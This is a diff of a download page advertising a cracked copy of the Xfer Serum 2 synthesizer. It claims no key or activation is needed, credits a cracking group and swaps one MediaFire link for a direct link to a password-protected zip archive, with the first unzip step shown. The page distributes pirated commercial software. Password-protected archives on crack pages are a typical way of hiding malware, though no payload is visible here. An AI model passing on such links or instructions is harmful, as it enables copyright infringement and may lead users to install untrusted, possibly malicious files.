@@ -1,7 +1,7 @@
 # Serum 2 Unlocked / VST / No key / No activation / Download
 ## Xfer Serum 2 No activation, no key, or anything similar required. Includes a crack by the V.R Team. This is a new version of the synthesizer, and it works perfectly.
 
-<a href="https://www.mediafire.com/folder/wneh4jo9eefjw/serum_2"> Download Serum 2 here (password: serum) </a>
+<a href="https://www.mediafire.com/file/vsy3p0evtyztctu/Xfer+Records+-+Serum+2+v2.1.2.zip/file"> Download Serum 2 here (password: serum) </a>
 
 ## Installation:
 1. Unzip the archive (password: serum)
